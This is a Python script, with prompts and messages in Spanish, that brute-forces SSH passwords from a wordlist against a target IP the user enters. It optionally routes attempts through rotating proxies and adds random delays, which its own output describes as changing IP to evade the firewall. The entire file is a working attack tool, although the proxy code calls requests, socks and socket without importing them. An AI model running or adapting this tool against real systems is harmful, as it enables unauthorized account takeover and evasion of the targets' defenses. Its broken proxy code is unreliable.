import time
import os
import random
import paramiko
import signal
from colorama import Fore, Style, init

init()

def load_proxies(file_path):
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
        proxies = file.read().splitlines()
    return proxies

def get_random_proxy(proxies):
    return random.choice(proxies)

def is_proxy_working(proxy):
    proxy_type = "http" if proxy.startswith("http") else "socks4" if proxy.startswith("socks4") else "socks5"
    proxies = {proxy_type: proxy}
    try:
        response = requests.get("http://www.google.com", proxies=proxies, timeout=5)
        return response.status_code == 200
    except:
        return False

def set_proxy(proxy):
    if proxy.startswith("http"):
        os.environ["http_proxy"] = proxy
        os.environ["https_proxy"] = proxy
    elif proxy.startswith("socks4"):
        socks.set_default_proxy(socks.SOCKS4, proxy.split("//")[1].split(":")[0], int(proxy.split(":")[-1]))
        socket.socket = socks.socksocket
    elif proxy.startswith("socks5"):
        socks.set_default_proxy(socks.SOCKS5, proxy.split("//")[1].split(":")[0], int(proxy.split(":")[-1]))
        socket.socket = socks.socksocket
    pass

def ssh_brute_force(host, port, username, password_file, use_proxies, proxies):
    with open(password_file, 'r', encoding='utf-8', errors='ignore') as file:
        passwords = file.readlines()
    
    for index, password in enumerate(passwords):
        password = password.strip()
        if use_proxies:
            proxy = get_random_proxy(proxies)
            if is_proxy_working(proxy):
                set_proxy(proxy)
            else:
                print(f"{Fore.YELLOW}[*] Proxy no funciona: {proxy}{Style.RESET_ALL}")
                continue
        
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=port, username=username, password=password, timeout=10)
            print(f"{Fore.GREEN}[+] Contraseña encontrada: {password}{Style.RESET_ALL}")
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            print(f"{Fore.RED}[-] Contraseña incorrecta: {password}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
        
        # Espera aleatoria entre 1 y 5 segundos
        time.sleep(random.uniform(1, 5))
        
        if index % 5 == 0 and use_proxies:
            print("[*] Cambiando dirección IP para evadir el firewall...")
            time.sleep(5)
    
    print("[-] No se encontró ninguna contraseña válida.")
    return False

def signal_handler(sig, frame):
    print("\nPrograma terminado por el usuario.")
    exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGTSTP, signal_handler)  # Capturar Ctrl + Z

    host = input("Introduce la IP del objetivo: ")
    port = 22  # Puerto SSH
    username = input("Introduce el nombre de usuario: ")
    password_file = input("Introduce la ruta del archivo de contraseñas: ")
    
    use_proxies = input("¿Deseas usar proxies? (Y/N): ").strip().upper() == 'Y'
    proxies_file = input("Introduce la ruta del archivo de proxies: ") if use_proxies else ''
    proxies = load_proxies(proxies_file) if use_proxies else []
    
    ssh_brute_force(host, port, username, password_file, use_proxies, proxies)
